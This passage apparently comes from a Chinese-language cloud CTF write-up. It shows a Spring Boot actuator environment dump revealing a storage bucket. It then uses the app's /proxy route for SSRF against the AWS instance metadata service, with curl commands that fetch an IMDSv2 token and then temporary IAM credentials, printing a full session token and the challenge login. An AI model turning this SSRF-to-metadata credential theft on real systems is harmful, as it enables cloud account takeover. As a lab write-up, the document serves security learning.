class="punctuation">:</span> <span class="string">&quot;HotSpot 64-Bit Tiered Compilers&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.runtime.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;24.0.1+9-FR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user.name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ec2-user&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stdout.encoding&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path.separator&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;:&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;os.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6.1.134-152.225.amzn2023.x86_64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.runtime.name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;OpenJDK Runtime Environment&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file.encoding&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vm.name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;OpenJDK 64-Bit Server VM&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vendor.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Corretto-24.0.1.9.1&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vendor.url.bug&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/corretto/corretto-24/issues/&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.io.tmpdir&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;catalina.home&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/tomcat.8080.7538161798062223442&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;24.0.1&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user.dir&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/ec2-user/spring-boot&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;os.arch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;amd64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vm.specification.name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Java Virtual Machine Specification&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PID&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;515405&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;CONSOLE_LOG_CHARSET&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;catalina.base&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/tomcat.8080.7538161798062223442&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;native.encoding&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.library.path&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/java/packages/lib:/usr/lib64:/lib64:/lib:/usr/lib&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vm.info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mixed mode, sharing&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stderr.encoding&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vendor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Amazon.com Inc.&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vm.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;24.0.1+9-FR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sun.io.unicode.encoding&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UnicodeLittle&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.class.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;68.0&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LOGGED_APPLICATION_NAME&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[spring] &quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;systemEnvironment&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;INVOCATION_ID&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cb49fb685ed2497eb60672956106753c&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;INVOCATION_ID\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;HOME&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/ec2-user&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;HOME\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PATH&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;PATH\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SHELL&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/bin/bash&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;SHELL\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;BUCKET&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;challenge01-470f711&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;BUCKET\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LOGNAME&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ec2-user&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;LOGNAME\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;USER&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ec2-user&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;USER\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SYSTEMD_EXEC_PID&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;515405&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;SYSTEMD_EXEC_PID\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LANG&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C.UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;LANG\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;JOURNAL_STREAM&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8:1745835&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;System Environment Property \&quot;JOURNAL_STREAM\&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Config resource &#x27;class path resource [application.properties]&#x27; via location &#x27;optional:classpath:/&#x27;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;spring.application.name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;spring&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 1:25&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;management.endpoints.web.exposure.include&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 2:43&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;management.endpoints.web.expose&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 3:33&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;management.endpoint.env.show-values&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;always&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 4:37&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;server.error.include-message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;always&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 5:30&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;applicationInfo&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;spring.application.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.1-SNAPSHOT&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;spring.application.pid&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">515405</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>在<code>/actuator/env</code>中找到了一个桶</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509231940994.png" alt="image-20250923194024810"></p>
<p>尝试匿名访问这个桶，没权限访问</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509231945043.png" alt="image-20250923194516866"></p>
<p>在这个网站的默认页面，有提示<code>Welcome to the proxy server</code></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232043931.png" alt="image-20250923204342808"></p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>在<code>/actuator/mappings</code>里面有<code>/proxy</code>路由的信息</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232046457.png" alt="image-20250923204610332"></p>
<p>可以尝试在<code>/proxy</code>页面使用ssrf访问aws元数据</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509232051544.png" alt="image-20250923205127426"></p>
<h3 id="获取EC2实例角色临时凭证"><a href="#获取EC2实例角色临时凭证" class="headerlink" title="获取EC2实例角色临时凭证"></a><strong>获取EC2实例角色临时凭证</strong></h3><p>页面401启用了<code>IMDSv2</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>/mnt/c/Users/legion$ TOKEN=$(curl -X PUT <span class="string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token&quot;</span> -H <span class="string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span>) &amp;&amp; \</span><br><span class="line">curl -H <span class="string">&quot;X-aws-ec2-metadata-token: $TOKEN&quot;</span> <span class="string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/&quot;</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"><span class="number">100</span>    <span class="number">56</span>  <span class="number">100</span>    <span class="number">56</span>    <span class="number">0</span>     <span class="number">0</span>      <span class="number">4</span>      <span class="number">0</span>  <span class="number">0</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">14</span>  <span class="number">0</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">13</span>  <span class="number">0</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">01</span>    <span class="number">11</span></span><br><span class="line">ami-id</span><br><span class="line">ami-launch-index</span><br><span class="line">ami-manifest-path</span><br><span class="line">block-device-mapping/</span><br><span class="line">events/</span><br><span class="line">hibernation/</span><br><span class="line">hostname</span><br><span class="line">iam/</span><br><span class="line">identity-credentials/</span><br><span class="line">instance-action</span><br><span class="line">instance-id</span><br><span class="line">instance-life-cycle</span><br><span class="line">instance-type</span><br><span class="line">local-hostname</span><br><span class="line">local-ipv4</span><br><span class="line">mac</span><br><span class="line">metrics/</span><br><span class="line">network/</span><br><span class="line">placement/</span><br><span class="line">profile</span><br><span class="line">public-hostname</span><br><span class="line">public-ipv4</span><br><span class="line">public-keys/</span><br><span class="line">reservation-id</span><br><span class="line">security-groups</span><br><span class="line">services/</span><br><span class="line">system</span><br></pre></td></tr></table></figure>

<p>访问iam中心获取一组AKSK</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>/mnt/c/Users/legion$ TOKEN=$(curl -X PUT <span class="string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token&quot;</span> -H <span class="string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span>) &amp;&amp; curl -H <span class="string">&quot;X-aws-ec2-metadata-token: $TOKEN&quot;</span> <span class="string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368&quot;</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"><span class="number">100</span>    <span class="number">56</span>  <span class="number">100</span>    <span class="number">56</span>    <span class="number">0</span>     <span class="number">0</span>     <span class="number">36</span>      <span class="number">0</span>  <span class="number">0</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">01</span>  <span class="number">0</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">01</span> --<span class="punctuation">:</span>--<span class="punctuation">:</span>--    <span class="number">36</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Code&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Success&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;LastUpdated&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2025-09-23T12:45:33Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS-HMAC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AccessKeyId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ASIAR***XLN7XBL3X&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SecretAccessKey&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;zpZgR7X************/W9R6r6EhQ0lpudr/N&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Token&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;IQoJb3JpZ2luX2VjEL3//////////wEaCXVzLWVhc3QtMSJGMEQCICnlb/ixxn6hNBMkwGEwfIGKsUQkvXSzoqdmxw9D0pbOAiA6bReMkKSzDl6HbzkC8pHDGpx9bzrigFHjluQlbmxmfiq4BQhGEAAaDDA5MjI5Nzg1MTM3NCIMT/gVkQMw6R+dcqi/KpUF93F1OS+95nRgsoe6TZsXC63IX4T9JQNO94qfZly0w38cPoUmGGmlY3vHyJ8AjcJl6zZKbHR89wweZyRcgu0Jc8suU716ritwsHrtzCUuz9Jj0T00WCooqwH09kv6Ou9e6XjXyL7QRlsZPAoEFAsZy9927gzAuHHXEkBN4Nwz9aCqz/hkbeuUSZDBi4wNWWxF05Bv+RMVNR4Hf2wYai6JupaNvd54dcdopeiQjEjkr3E0F/RbK0CffxQSth59AqH5fFhaXLJU7E+K/0wRPnE6c6P/FVEu/P9kBz9YsCgTsm5/DKfgdD/XOAzgtXMJ451tDXxVDv3Qhf6MOD3QkZVF/kVeUo01v3XQGR8hrtlCSeOZAI4QfKiPxjYzVYq2cAd3+DpLOfdpIUWcyrfXhNJI6qTZf48MvhAjKr5vd5U2RzsJAGPAMzLJxNjnda992YXVwDPeuLK+0vHW2y8ifdLl1wU0hDAAIpspFtHrZJm+YIY0sn3zBT6uxL/MZbZgLojDANMA+IZdU+j0Wz1KlzXPwDIdbKBZ7PgQX0HBsjKzUR65QlQpjJgOaE4mV7ajS1AQFC9rE9yUXMen7oOIEJFOMa/qm+PKvvyu9yrOXXR6YO4FR7zNSGWIdHaldsVrOsB30bUTUH7CznnDiGmv7/GaOrkWVwG+7pj3mUYVRn+Np5zbCmkEVKDQfW9W/0wKMlGzQGSIYI96d0n0hmzbOJg3IcyYd7EU3qJs41WhdR9SPwES1kYnc5cM9f3XSlt5Wxyg4kzmG8IOlZnPj5YMdVVwEK6Y2omTtgnnlga/kNLRT5bh+HQCrWcUFhYDL/H/LlKjMSX62XCBVkmJGx/xHW/OGLnCxmozuTmLy8+CrzaCHCQHQ6lJlDDFrMrGBjqyASQf9dsMEd+IiVOCrGagNz8JUAAd3S2DOkS83I+n+4D4BBCMou245YuhOHDpgsMmGHNlazq/9ThrKklyIuoUK+n50ZPSajto3Zu3sgfQp95VPvSJBjK/fjVf+WaH6rRV1POxVevqyxI4Z2QqUX+X2s0WhnyVTN29zKm4lGDP7urf/pCdx4YUPhjdoSY3V2fu/kfxKV6K0RcKQ6i882RDVNdXWx7M8umTbhsiU4LVuE6nBTE=&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Expiration&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2025-09-23T19:11:53Z&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问刚才获取的那个桶，可得到地区信息</p>
